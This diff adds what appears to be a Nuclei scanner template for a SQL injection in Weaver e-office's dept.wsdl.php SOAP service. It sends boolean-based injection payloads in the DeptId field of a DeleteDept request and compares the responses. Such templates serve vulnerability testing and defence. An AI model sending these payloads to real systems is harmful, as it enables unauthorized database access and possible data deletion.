@@ -1,0 +1,53 @@
+id: e-office-dept-sqli
+
+info:
+  name: 泛微e-office dept.wsdl.php sql注入漏洞
+  author: Weaver
+  severity: high
+  tags: Weaver
+
+http:
+  - raw:
+      - |
+        POST /webservice-json/dept/dept.wsdl.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        SOAPAction: urn:DepartmentServicewsdl#DeleteDept
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                 <DeptId xsi:type="xsd:string">aaa'and'a'='a</DeptId>
+              </urn:DeleteDept>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+      - |
+        POST /webservice-json/dept/dept.wsdl.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        SOAPAction: urn:DepartmentServicewsdl#DeleteDept
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                 <DeptId xsi:type="xsd:string">aaa'and'a'='aa</DeptId>
+              </urn:DeleteDept>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_1, "xsi:type=\"xsd:string\"><")
+          - contains(body_2, "xsi:type=\"xsd:string\">1<")
+        condition: and
+
